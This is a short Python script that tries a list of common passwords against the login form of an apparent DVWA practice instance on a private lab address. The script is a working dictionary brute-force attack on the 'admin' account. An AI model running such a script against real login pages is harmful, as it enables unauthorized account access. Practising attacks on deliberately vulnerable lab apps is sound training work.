import requests

user = 'admin'
passwords = ['1234', 'qwerty', 'test', 'admin', 'pass', 'password123', 'Password', 'password']

data = {'username': user, 'password': '', 'Login': 'Login'}

print('Looking for password for user "{}"'.format(user))
for password in passwords:

    data['password'] = password
    resp = requests.post('http://192.168.56.101/dvwa/login.php', data=data)

    if 'You have logged in' in resp.text:
        print('\nPassword for admin is: "{}"\n'.format(password))
    else:
        print('Tried "{}" with no luck :('.format(password))
